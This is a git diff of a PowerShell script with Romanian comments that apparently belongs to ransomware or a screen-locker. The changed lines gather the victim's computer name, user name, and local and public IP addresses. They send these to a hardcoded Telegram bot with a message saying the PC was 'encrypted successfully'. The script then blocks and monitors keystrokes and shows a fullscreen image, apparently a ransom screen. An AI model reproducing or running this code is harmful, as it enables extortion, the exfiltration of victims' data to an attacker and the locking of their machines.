@@ -110,18 +110,32 @@ function Show-FullScreenImage {
     [System.Windows.Forms.Application]::Run()
 }
 
-# Execuție
+# Execuție principală
 Download-Image
 
-# Telegram
+# Trimite mesaj pe Telegram
 $pc = $env:COMPUTERNAME
 $user = $env:USERNAME
-$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
-try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string] } catch { $ipPublic = "n/a" }
+
+$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
+    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+
+try {
+    $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
+} catch {
+    $ipPublic = "n/a"
+}
+
 $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
 $uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
-$body = @{ chat_id = '656189986'; text = $message } | ConvertTo-Json -Compress
-try { Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json' } catch {}
+$body = @{
+    'chat_id' = '656189986'
+    'text'    = $message
+} | ConvertTo-Json -Compress
+
+try {
+    Invoke-RestMethod -Uri $uri -Method POST -Body $body -ContentType 'application/json'
+} catch {}
 
 Block-And-MonitorKeys
 Show-FullScreenImage
